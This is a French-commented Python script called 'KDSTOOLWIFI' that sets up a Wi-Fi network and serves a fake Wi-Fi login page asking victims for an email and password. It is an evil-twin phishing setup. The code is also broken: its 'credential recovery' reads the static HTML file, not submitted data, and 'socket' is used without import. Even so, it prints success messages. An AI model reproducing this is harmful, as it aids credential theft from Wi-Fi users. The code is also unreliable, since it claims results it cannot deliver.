import android_wifi
import psutil
import getpass
from colorama import init, Fore, Back, Style
import requests
import itertools
import http.server
import socketserver
import threading
import os
import webbrowser
import subprocess

init(autoreset=True)

# Titre en ASCII
print(Fore.GREEN + """
  _______
 /       \
|  KDSTOOLWIFI  |
 _______/
""")

# Demande le nom du réseau Wi-Fi
wifi_name = input(Fore.CYAN + "Entrez le nom de votre réseau Wi-Fi : ")

# Demande si l'utilisateur veut mettre un mot de passe
password_required = input(Fore.CYAN + "Voulez-vous mettre un mot de passe pour votre réseau Wi-Fi ? (o/n) : ")

if password_required.lower() == 'o':
    # Demande le mot de passe
    password = getpass.getpass(Fore.CYAN + "Entrez le mot de passe pour votre réseau Wi-Fi : ")
else:
    password = None

# Crée un objet android_wifi
wifi = android_wifi.AndroidWifi()

# Crée un réseau Wi-Fi
wifi.create_wifi_network(wifi_name, password)

print(Fore.GREEN + "Réseau Wi-Fi créé avec succès !")

# Crée une page HTML
html = """
<html>
  <head>
    <title>Connexion au réseau Wi-Fi</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f0f0f0;
      }
      .container {
        width: 300px;
        margin: 50px auto;
        padding: 20px;
        background-color: #fff;
        border: 1px solid #ddd;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      }
      .header {
        text-align: center;
        margin-bottom: 20px;
      }
      .header h1 {
        font-size: 24px;
        font-weight: bold;
        color: #333;
      }
      .form {
        margin-top: 20px;
      }
      .form input[type="email"], .form input[type="password"] {
        width: 100%;
        height: 40px;
        margin-bottom: 20px;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 5px;
      }
      .form input[type="submit"] {
        width: 100%;
        height: 40px;
        background-color: #4CAF50;
        color: #fff;
        padding: 10px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }
      .form input[type="submit"]:hover {
        background-color: #3e8e41;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <h1>Connexion au réseau Wi-Fi</h1>
      </div>
      <form class="form" action="" method="post">
        <input type="email" name="email" placeholder="Adresse e-mail">
        <input type="password" name="password" placeholder="Mot de passe">
        <input type="submit" value="Se connecter">
      </form>
    </div>
  </body>
</html>
"""

# Enregistrez la page HTML dans un fichier
with open("index.html", "w") as f:
    f.write(html)

# Créez un serveur HTTP simple pour servir la page HTML
def serve_http():
    with socketserver.TCPServer(("", 8080), http.server.SimpleHTTPRequestHandler) as httpd:
        print("Serving HTTP on port 8080...")
        httpd.serve_forever()

# Démarrez le serveur HTTP dans un thread séparé
threading.Thread(target=serve_http).start()

# Redirige l'utilisateur vers la page HTML
webbrowser.open("http://localhost:8080/index.html")

# Fonction pour récupérer les informations de connexion
def get_wifi_credentials():
    # Récupère les informations de connexion à partir de la page HTML
    with open("index.html", "r") as f:
        html_content = f.read()
    email = None
    password = None
    for line in html_content.splitlines():
        if "email" in line:
            email = line.split("=")[1].strip().replace('"', '')
        elif "password" in line:
            password = line.split("=")[1].strip().replace('"', '')
    return email, password

# Récupère les informations de connexion
email, password = get_wifi_credentials()

print(Fore.GREEN + "Informations de connexion récupérées avec succès !")
print("Adresse e-mail : " + email)
print("Mot de passe : " + password)

# Utilisez le module subprocess pour exécuter des commandes système sans nécessiter d'accès root
def execute_command(command):
    try:
        subprocess.check_output(command, shell=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + "Erreur lors de l'exécution de la commande : " + str(e))

# Exécutez des commandes système pour configurer le réseau Wi-Fi
execute_command("ip link set wlan0 up")
execute_command("ip addr add 192.168.1.1/24 brd 192.168.1.255 dev wlan0")
execute_command("ip link set wlan0 multicast on")

print(Fore.GREEN + "Réseau Wi-Fi configuré avec succès !")

# Affichez les informations du système
print(Fore.CYAN + "Informations du système :")
print("Nom de l'utilisateur : " + getpass.getuser())
print("Nom de la machine : " + socket.gethostname())
print("Adresse IP : " + requests.get('https://api.ipify.org').text.strip())
print("Liste des processus en cours :")
for proc in psutil.process_iter(['pid', 'name', 'username']):
    try:
        info = proc.info
        print(Fore.CYAN + f"PID : {info['pid']} - Nom : {info['name']} - Utilisateur : {info['username']}")
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        pass

print(Fore.GREEN + "Fin du programme.")
